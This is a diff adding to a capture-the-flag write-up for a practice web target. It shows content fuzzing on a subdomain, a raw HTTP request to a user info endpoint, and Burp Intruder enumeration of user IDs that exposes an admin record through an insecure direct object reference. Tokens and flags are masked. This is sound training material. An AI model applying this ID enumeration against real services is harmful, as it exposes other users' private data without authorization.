@@ -229,3 +229,48 @@ vulnbegin.co.uk	text = "[^FLAG^XXXXXXXXXXXXXXXXXX^FLAG^]"
 ```
 
 Cool there's flag no.1 :)
+
+Right OK so I haven't fuzzed for content on the server.vulbegin.co.uk domain so I went off and did that and found a result
+at ```server.vulbegin.co.uk/user```
+
+Which lead me to an info endpoint
+
+```
+GET /user/27/info HTTP/1.1
+Host: server.vulnbegin.co.uk
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Token: xxxx
+Connection: close
+Cookie: ctfchallenge=xxxx
+```
+
+Which gives me flag no.8 :)
+
+```
+HTTP/1.1 200 OK
+server: nginx/1.21.1
+date: Sun, 05 Jun 2022 09:20:03 GMT
+content-type: application/json
+set-cookie: ctfchallenge=xxxx; Max-Age=2592000; Path=/; domain=.vulnbegin.co.uk
+connection: close
+Content-Length: 138
+
+{"id":27,"username":"vulnbegin_website","description":"User for the main website","flag":"[^FLAG^XXXXXXXX^FLAG^]"}
+```
+
+So this smells like an IDOR, using Intruder on the user ID I got a hit on an ID of 5 :). That's flag no.9 and the room is complete :)
+
+```
+HTTP/1.1 200 OK
+server: nginx/1.21.1
+date: Sun, 05 Jun 2022 09:25:27 GMT
+content-type: application/json
+set-cookie: ctfchallenge=xxxx; Max-Age=2592000; Path=/; domain=.vulnbegin.co.uk
+connection: close
+Content-Length: 120
+
+{"id":5,"username":"admin","description":"admin for the server","flag":"[^FLAG^xxxxxxxxx^FLAG^]"}
+```
